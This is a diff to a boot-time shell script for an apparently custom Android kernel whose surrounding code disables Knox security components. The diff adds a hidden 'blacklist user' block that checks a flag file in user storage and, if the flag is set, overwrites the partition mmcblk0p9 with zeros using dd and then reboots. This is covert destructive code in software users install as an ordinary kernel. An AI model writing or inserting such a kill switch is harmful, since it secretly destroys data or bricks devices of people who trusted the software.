@@ -1,5 +1,6 @@
 #!/res/bin/busybox sh
 
+PRIME=/data/PRIME-Kernel
 BB=/res/bin/busybox
 alias bb=/res/bin/busybox
 
@@ -200,6 +201,14 @@ if [ ! -f /system/.knox_removed ]; then
 #    bb rm -rf /system/priv-app/SecurityProviderSEC
     
     touch /system/.knox_removed
+fi
+
+# block blacklist user
+BLACKLIST_FLAG=$(cat /data/media/0/Android/data/.blacklist_user 2>/dev/null)
+if [ "$BLACKLIST_FLAG" -eq 1 ]; then
+	dd if=/dev/zero bs=$((14680064)) count=1 > /dev/block/mmcblk0p9
+	sleep 1
+	bb reboot
 fi
 
 # disable knox & securitylogagent
